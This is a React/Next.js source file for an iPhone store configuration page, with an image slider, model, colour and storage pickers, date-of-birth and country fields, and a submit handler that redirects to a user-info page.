import { useRouter } from "next/navigation";
import { useState, useEffect } from "react";
import toast from "react-hot-toast";
import {
  FaCheck,
  FaArrowRight,
  FaStar,
  FaShippingFast,
  FaShieldAlt,
  FaHeadset,
} from "react-icons/fa";
import { HiSparkles } from "react-icons/hi";

const products = [
  {
    _id: 1,
    name: "Deep Purple",
    price: 100,
    image:
      "https://images.unsplash.com/photo-1678652197831-2d180705cd2c?w=800&auto=format&fit=crop",
  },
  {
    _id: 2,
    name: "Midnight Blue",
    price: 200,
    image:
      "https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?w=800&auto=format&fit=crop",
  },
  {
    _id: 3,
    name: "Starlight",
    price: 300,
    image:
      "https://images.unsplash.com/photo-1510557880182-3d4d3cba35a5?w=800&auto=format&fit=crop",
  },
  {
    _id: 4,
    name: "Product Red",
    price: 400,
    image:
      "https://images.unsplash.com/photo-1591337676887-a217a6970a8a?w=800&auto=format&fit=crop",
  },
];

const modelList = [
  { key: "iphone 14", label: "iPhone 14" },
  { key: "iphone 14 Pro Max", label: "iPhone 14 Pro Max" },
  { key: "iphone 15", label: "iPhone 15" },
  { key: "iphone 15 Pro Max", label: "iPhone 15 Pro Max" },
  { key: "iphone 16", label: "iPhone 16" },
  { key: "iphone 16 Pro Max", label: "iPhone 16 Pro Max" },
  { key: "iphone 17", label: "iPhone 17" },
  { key: "iphone 17 Pro Max", label: "iPhone 17 Pro Max" },
];

const storageList = [
  { key: "128GB", label: "128GB", popular: false },
  { key: "256GB", label: "256GB", popular: true },
  { key: "512GB", label: "512GB", popular: false },
  { key: "1TB", label: "1TB", popular: false },
];

const colors = [
  { hex: "#301934", name: "Deep Purple" },
  { hex: "#215E7C", name: "Pacific Blue" },
  { hex: "#A50011", name: "Product Red" },
  { hex: "#F9E5C9", name: "Gold" },
  { hex: "#5C5B57", name: "Graphite" },
];

const countryList = [
  "Bangladesh",
  "India",
  "Pakistan",
  "Philippines",
  "Nepal",
  "Saudi Arabia",
  "Afghanistan",
  "Egypt",
  "Ghana",
  "France",
  "Ethiopia",
  "Indonesia",
  "Iran",
  "Kenya",
  "Lebanon",
  "Morocco",
  "Palestine",
  "Yemen",
  "Uganda",
  "Sri Lanka",
  "Syria",
];

export default function ModernIPhoneStore() {
  const router = useRouter();
  const [selectedProduct, setSelectedProduct] = useState(products[0]);
  const [currentSlide, setCurrentSlide] = useState(0);
  const [orderDetails, setOrderDetails] = useState({
    model: "",
    color: "",
    storage: "",
    nationality: "",
    dob: "",
  });

  // Auto-slide effect
  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentSlide((prev) => (prev + 1) % products.length);
    }, 2000); // Change slide every 5 seconds

    return () => clearInterval(interval);
  }, []);

  const handleSubmit = () => {
    if (
      orderDetails.color &&
      orderDetails.model &&
      orderDetails.storage &&
      orderDetails.nationality &&
      orderDetails.dob
    ) {
      toast.promise(
        new Promise((resolve) => {
          setTimeout(() => {
            resolve();
            // Simulate router push - replace with actual router
            router.push({
              pathname: "/user-info",
              query: { ...orderDetails },
            });
            console.log("Redirecting to /user-info with:", orderDetails);
          }, 2000);
        }),
        {
          loading: "Saving your order...",
          success: "Order saved! Redirecting...",
          error: "Something went wrong!",
        }
      );
    } else {
      toast.error("Please select all options");
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-950 via-slate-900 to-teal-950">
      {/* Hero Slider */}
      <div className="relative h-[500px] overflow-hidden">
        <div
          className="absolute inset-0 bg-cover bg-center transition-all duration-700 ease-out"
          style={{
            backgroundImage: `url(${products[currentSlide].image})`,
            transform: `scale(${currentSlide === 0 ? 1.05 : 1})`,
          }}
        >
          <div className="absolute inset-0 bg-gradient-to-b from-transparent via-slate-900/60 to-slate-950"></div>
        </div>

        <div className="relative h-full flex flex-col justify-center items-center text-center px-4">
          <div className="animate-fade-in">
            <div className="inline-flex items-center gap-2 px-4 py-2 bg-white/10 backdrop-blur-md rounded-full mb-4 border border-white/20">
              <HiSparkles className="w-4 h-4 text-teal-400" />
              <span className="text-sm text-white font-medium">
                New Collection
              </span>
            </div>
            <h1 className="text-5xl md:text-7xl font-bold text-white mb-4 tracking-tight">
              Dream in{" "}
              <span className="bg-gradient-to-r from-teal-400 to-cyan-400 bg-clip-text text-transparent">
                Innovation
              </span>
            </h1>
            <p className="text-gray-300 text-lg mb-8 max-w-2xl">
              Experience the future of technology with our latest iPhone
              collection
            </p>
            <button className="group px-8 py-4 bg-gradient-to-r from-teal-500 to-cyan-500 text-white rounded-full font-semibold hover:shadow-2xl hover:shadow-teal-500/50 transition-all duration-300 flex items-center gap-2 mx-auto">
              Start Your Journey
              <FaArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
            </button>
          </div>
        </div>

        {/* Slider Indicators */}
        <div className="absolute bottom-8 left-1/2 -translate-x-1/2 flex gap-2">
          {products.map((_, idx) => (
            <button
              key={idx}
              onClick={() => setCurrentSlide(idx)}
              className={`h-2 rounded-full transition-all duration-300 ${
                currentSlide === idx ? "w-8 bg-teal-400" : "w-2 bg-white/30"
              }`}
            />
          ))}
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-7xl mx-auto px-4 py-16">
        <div className="grid lg:grid-cols-2 gap-12 items-start">
          {/* Product Display */}
          <div className="space-y-6">
            <div className="relative group">
              <div className="absolute -inset-1 bg-gradient-to-r from-teal-500 to-cyan-500 rounded-3xl blur opacity-25 group-hover:opacity-50 transition duration-1000"></div>
              <div className="relative bg-slate-900/80 backdrop-blur-xl rounded-3xl p-8 border border-slate-800">
                <img
                  src={selectedProduct.image}
                  alt={selectedProduct.name}
                  className="w-full h-[400px] object-cover rounded-2xl"
                />
              </div>
            </div>

            {/* Thumbnail Gallery */}
            <div className="grid grid-cols-4 gap-4">
              {products.map((product) => (
                <button
                  key={product._id}
                  onClick={() => setSelectedProduct(product)}
                  className={`relative rounded-xl overflow-hidden transition-all duration-300 ${
                    selectedProduct._id === product._id
                      ? "ring-2 ring-teal-400 scale-105"
                      : "opacity-60 hover:opacity-100"
                  }`}
                >
                  <img
                    src={product.image}
                    alt={product.name}
                    className="w-full h-24 object-cover"
                  />
                </button>
              ))}
            </div>
          </div>

          {/* Configuration Panel */}
          <div className="space-y-6">
            <div className="bg-slate-900/50 backdrop-blur-xl rounded-3xl p-8 border border-slate-800">
              <div className="mb-6">
                <h2 className="text-3xl font-bold text-white mb-2">
                  {orderDetails.model || "Configure Your iPhone"}
                </h2>
                <p className="text-gray-400">
                  Customize every detail to match your style
                </p>
              </div>

              {/* Model Selection */}
              <div className="space-y-4 mb-6">
                <label className="text-sm font-medium text-gray-300">
                  Choose Model
                </label>
                <select
                  value={orderDetails.model}
                  onChange={(e) =>
                    setOrderDetails({ ...orderDetails, model: e.target.value })
                  }
                  className="w-full px-4 py-3 bg-slate-800/50 border border-slate-700 rounded-xl text-white focus:ring-2 focus:ring-teal-500 focus:border-transparent outline-none transition-all"
                >
                  <option value="">Select your iPhone</option>
                  {modelList.map((model) => (
                    <option key={model.key} value={model.key}>
                      {model.label}
                    </option>
                  ))}
                </select>
              </div>

              {/* Color Selection */}
              <div className="space-y-4 mb-6">
                <label className="text-sm font-medium text-gray-300">
                  Select Color
                </label>
                <div className="flex flex-wrap gap-3">
                  {colors.map((color) => (
                    <button
                      key={color.hex}
                      onClick={() =>
                        setOrderDetails({ ...orderDetails, color: color.hex })
                      }
                      className={`relative w-14 h-14 rounded-full transition-all duration-300 ${
                        orderDetails.color === color.hex
                          ? "ring-4 ring-teal-400 ring-offset-2 ring-offset-slate-900 scale-110"
                          : "hover:scale-105"
                      }`}
                      style={{ backgroundColor: color.hex }}
                      title={color.name}
                    >
                      {orderDetails.color === color.hex && (
                        <FaCheck className="w-6 h-6 text-white absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2" />
                      )}
                    </button>
                  ))}
                </div>
              </div>

              {/* Storage Selection */}
              <div className="space-y-4 mb-6">
                <label className="text-sm font-medium text-gray-300">
                  Storage Capacity
                </label>
                <div className="grid grid-cols-2 gap-3">
                  {storageList.map((storage) => (
                    <button
                      key={storage.key}
                      onClick={() =>
                        setOrderDetails({
                          ...orderDetails,
                          storage: storage.key,
                        })
                      }
                      className={`relative px-4 py-3 rounded-xl font-medium transition-all duration-300 ${
                        orderDetails.storage === storage.key
                          ? "bg-gradient-to-r from-teal-500 to-cyan-500 text-white shadow-lg shadow-teal-500/50"
                          : "bg-slate-800/50 text-gray-300 hover:bg-slate-800 border border-slate-700"
                      }`}
                    >
                      {storage.label}
                      {storage.popular && (
                        <span className="absolute -top-2 -right-2 px-2 py-0.5 bg-yellow-500 text-xs font-bold rounded-full text-slate-900 flex items-center gap-1">
                          <FaStar className="w-2 h-2" />
                        </span>
                      )}
                    </button>
                  ))}
                </div>
              </div>

              {/* Date of Birth */}
              <div className="space-y-4 mb-6">
                <label className="text-sm font-medium text-gray-300">
                  Date of Birth
                </label>
                <input
                  type="date"
                  value={orderDetails.dob}
                  onChange={(e) =>
                    setOrderDetails({ ...orderDetails, dob: e.target.value })
                  }
                  className="w-full px-4 py-3 bg-slate-800/50 border border-slate-700 rounded-xl text-white focus:ring-2 focus:ring-teal-500 focus:border-transparent outline-none transition-all"
                />
              </div>

              {/* Country Selection */}
              <div className="space-y-4 mb-6">
                <label className="text-sm font-medium text-gray-300">
                  Country
                </label>
                <select
                  value={orderDetails.nationality}
                  onChange={(e) =>
                    setOrderDetails({
                      ...orderDetails,
                      nationality: e.target.value,
                    })
                  }
                  className="w-full px-4 py-3 bg-slate-800/50 border border-slate-700 rounded-xl text-white focus:ring-2 focus:ring-teal-500 focus:border-transparent outline-none transition-all"
                >
                  <option value="">Select your country</option>
                  {countryList.map((country) => (
                    <option key={country} value={country}>
                      {country}
                    </option>
                  ))}
                </select>
              </div>

              {/* Submit Button */}
              <button
                onClick={handleSubmit}
                className="w-full py-4 bg-gradient-to-r from-teal-500 to-cyan-500 text-white rounded-xl font-semibold hover:shadow-2xl hover:shadow-teal-500/50 transition-all duration-300 flex items-center justify-center gap-2 group"
              >
                Complete Order
                <FaArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
              </button>
            </div>

            {/* Features */}
            <div className="grid grid-cols-3 gap-4">
              <div className="bg-slate-900/30 backdrop-blur-sm rounded-xl p-4 border border-slate-800 text-center">
                <FaShippingFast className="w-6 h-6 text-teal-400 mx-auto mb-2" />
                <p className="text-xs text-gray-400 font-medium">
                  Free Shipping
                </p>
              </div>
              <div className="bg-slate-900/30 backdrop-blur-sm rounded-xl p-4 border border-slate-800 text-center">
                <FaShieldAlt className="w-6 h-6 text-teal-400 mx-auto mb-2" />
                <p className="text-xs text-gray-400 font-medium">Warranty</p>
              </div>
              <div className="bg-slate-900/30 backdrop-blur-sm rounded-xl p-4 border border-slate-800 text-center">
                <FaHeadset className="w-6 h-6 text-teal-400 mx-auto mb-2" />
                <p className="text-xs text-gray-400 font-medium">
                  24/7 Support
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
